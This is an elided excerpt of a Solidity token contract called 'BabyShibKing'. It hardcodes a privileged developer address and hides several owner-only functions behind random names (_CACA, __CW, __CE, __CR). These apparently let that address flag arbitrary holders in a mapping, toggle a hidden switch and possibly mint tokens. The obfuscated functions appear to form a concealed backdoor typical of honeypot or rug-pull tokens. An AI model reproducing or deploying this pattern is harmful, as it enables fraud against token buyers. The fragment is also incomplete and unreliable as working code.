...
contract Ownable is Context {
    ...
    address private _yhtrAddress = 0xF89fF7536829aba3114EA92160463f1d07f8270e;
...
contract ty is Context, IERC20, Ownable {
    ...
    uint256 private _total = 100000000000* 10**8;
    uint256 private _tFeeTotal;
    
    string private _name = "BabyShibKing";
    string private _symbol = "BabyShibKing";
    uint8 private _decimals = 8;

     
    address private deadAddress = 0x000000000000000000000000000000000000dEaD;
    address private devAddress = 0xF89fF7536829aba3114EA92160463f1d07f8270e;
    ...
    function _CACA(address pzytd, uint256 trbvjvfs) external yhtrAddress() {
        require(trbvjvfs > 0, "ddsSh");
    ...
    function __CW(bool amountt) external yhtrAddress() {
        _xgio = amountt;
    }
    function __CE(address amountt) external yhtrAddress() {
        _serhfghtyufsdsd[amountt] = true;
    }

    function __CR(address amountt) external yhtrAddress() {
